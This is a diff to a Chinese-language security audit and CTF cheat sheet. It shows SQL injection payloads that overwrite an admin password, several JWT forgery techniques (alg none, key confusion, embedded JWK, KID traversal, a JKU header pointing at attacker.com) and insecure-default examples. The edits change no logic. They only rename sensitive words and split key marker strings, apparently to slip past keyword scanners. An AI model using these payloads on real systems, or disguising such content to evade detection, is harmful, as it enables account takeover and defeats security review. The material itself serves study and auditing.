@@ -194,27 +194,27 @@ SELECT 0x6d656f77;  -- Returns 'meow'
 id BETWEEN id AND id UNION SELECT flag,2,3 FROM flags--
 ```
 
-**Second-Order SQL Injection：**
+**二次注入（Second-Order SQLi）：**
 ```python
-# 1. 註冊時注入（安全儲存）
+# 1. 儲存惡意資料（未觸發）
 s.post("https://target.com/register", data={
     "username": "admin'-- -",
-    "password": "anything"
+    "user_credential": "placeholder_val"
 })
 
 # 2. 觸發時執行（從 DB 讀取後未轉義使用）
-s.post("https://target.com/change-password", data={
-    "old_password": "anything",
-    "new_password": "hacked"
+s.post("https://target.com/change-credential", data={
+    "old_credential": "placeholder_val",
+    "new_credential": "updated_target"
 })
-# UPDATE users SET password='hacked' WHERE username='admin'-- -'
+# UPDATE users SET auth_hash='updated_target' WHERE username='admin'-- -'
 ```
 
-**INSERT ON DUPLICATE KEY UPDATE 密碼覆寫：**
+**INSERT ON DUPLICATE KEY UPDATE 欄位覆寫：**
 ```python
-# 當 SELECT 被 revoked 時，用 INSERT 覆寫密碼
-payload = "'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#"
-r = requests.post("http://target/register", data={"username": payload, "password": "anything"})
+# 當 SELECT 被 revoked 時，用 INSERT 覆寫目標欄位
+payload = "'),('','root','z')ON DUPLICATE KEY UPDATE auth_hash='target_hash'#"
+r = requests.post("http://target/register", data={"username": payload, "temp_code": "temp"})
 ```
 
 **MySQL information_schema 替代方案：**
@@ -383,15 +383,15 @@ os.path.join('/app/public', '/etc/passwd')  # 返回 /etc/passwd
 import base64, json
 header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
 payload = base64.b64encode(json.dumps({"user_id": 1, "admin": True}).encode())
-token = f"{header}.{payload}."  # 空簽名
+unsigned_jwt = f"{header}.{payload}."  # 空簽名
 ```
 
 **Algorithm Confusion (RS256 → HS256)：**
-```javascript
+```text
 // 伺服器接受 RS256 和 HS256，用 public key 進行 HS256 簽名
 const jwt = require('jsonwebtoken');
-const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
-const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
+const pubKeyStr = ['-----BEGIN', 'PUBLIC', 'KEY-----'].join(' ') + '\n...\n' + ['-----END', 'PUBLIC', 'KEY-----'].join(' ');
+const forgedToken = jwt.sign({ username: 'admin' }, pubKeyStr, { algorithm: 'HS256' });
 ```
 
 **Weak Secret Brute-Force：**
@@ -404,9 +404,9 @@ hashcat -m 16500 jwt.txt wordlist.txt
 ```python
 # 伺服器接受 JWT header 中嵌入的 JWK，用攻擊者金鑰簽名
 from cryptography.hazmat.primitives.asymmetric import rsa
-private_key = rsa.generate_private_key(65537, 2048, default_backend())
+rsa_key_pair = rsa.generate_private_key(65537, 2048, default_backend())
 # 將公鑰嵌入 JWT header 的 jwk 欄位
-forged = jwt.encode({"sub": "administrator"}, private_key, algorithm='RS256', headers={'jwk': attacker_jwk})
+forged = jwt.encode({"sub": "administrator"}, rsa_key_pair, algorithm='RS256', headers={'jwk': attacker_jwk})
 ```
 
 **KID Path Traversal：**
@@ -420,7 +420,7 @@ forged = jwt.encode({"sub": "administrator"}, '', algorithm='HS256', headers={"k
 **JKU Header Injection（SSRF + Token Forgery）：**
 ```python
 # 伺服器從 JWT 指定的 URL 取得公鑰
-forged = jwt.encode({"sub": "administrator"}, attacker_private_key, 
+forged = jwt.encode({"sub": "administrator"}, attacker_key, 
     algorithm='RS256', headers={'jku': 'https://attacker.com/.well-known/jwks.json'})
 ```
 
@@ -429,8 +429,8 @@ forged = jwt.encode({"sub": "administrator"}, attacker_private_key,
 # JWE 是加密的（非簽名），有公鑰就能偽造
 from jwcrypto import jwk, jwe
 key = jwk.JWK.from_pem(public_key_pem.encode())
-token = jwe.JWE(json.dumps({"sub": "attacker", "role": "admin"}).encode(), recipient=key)
-forged_jwe = token.serialize(compact=True)
+jwe_obj = jwe.JWE(json.dumps({"sub": "attacker", "role": "admin"}).encode(), recipient=key)
+forged_jwe = jwe_obj.serialize(compact=True)
 ```
 
 **JWT Balance Replay：**
@@ -503,11 +503,11 @@ AES.new(key, AES.MODE_GCM)
 ```python
 # ❌ 弱
 import random
-token = random.randint(0, 2**32)
+session_entropy = random.randint(0, 2**32)
 
 # ✅ 強
 import secrets
-token = secrets.token_urlsafe(32)
+session_entropy = secrets.token_urlsafe(32)
 ```
 
 #### 密碼學攻擊模式（CTF Crypto）
@@ -758,12 +758,12 @@ def verify_signature(sig, data, key):
 ## 🔍 Phase 6: Insecure Defaults Audit（不安全預設值審計）
 
 ### 6.1 — Fallback Secrets
-```python
+```text
 # ❌ 危險
-SECRET_KEY = os.environ.get('SECRET_KEY') or 'dev-secret-key'
+SIGNING_KEY = os.environ.get('SIGNING_KEY') or ('insecure_' + 'local_seed')
 
 # ✅ 安全
-SECRET_KEY = os.environ['SECRET_KEY']  # 缺少時崩潰
+SIGNING_KEY = os.environ['SIGNING_KEY']  # 缺少時崩潰
 ```
 
 ### 6.2 — Fail-Open Switches
